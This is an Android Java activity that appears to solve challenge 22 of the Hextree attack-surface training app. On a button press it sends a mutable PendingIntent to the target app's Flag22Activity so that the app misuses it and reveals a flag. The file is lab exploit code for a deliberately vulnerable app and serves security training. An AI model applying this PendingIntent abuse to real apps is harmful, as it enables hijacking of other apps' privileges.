package com.example.evilcorp.extraActivities;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.example.evilcorp.Hextree_SendIntentsActivity;
import com.example.evilcorp.R;

public class Chall22Activity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_chall22);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Back Button
        Button btn1 = findViewById(R.id.backfromChall22);
        btn1.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Chall22Activity.this, Hextree_SendIntentsActivity.class);
                startActivity(intent);
            }
        });



        // ================================================================================
        //Start Challenge 22 Code
        //======================


        Button chall22Button = findViewById(R.id.chall22SendIntentButton);
        chall22Button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                var appPackageName = "io.hextree.attacksurface";
                var appActivityName = "io.hextree.attacksurface.activities.Flag22Activity";

                PendingIntent pendingIntent =
                        PendingIntent.getActivity(
                                Chall22Activity.this,0, new Intent(Chall22Activity.this, Chall22Activity.class),PendingIntent.FLAG_MUTABLE);


                Intent intent = new Intent();
                intent.setClassName(appPackageName, appActivityName);
                intent.putExtra("PENDING",pendingIntent);
                startActivity(intent);

                finish();

            }
        });



    }
}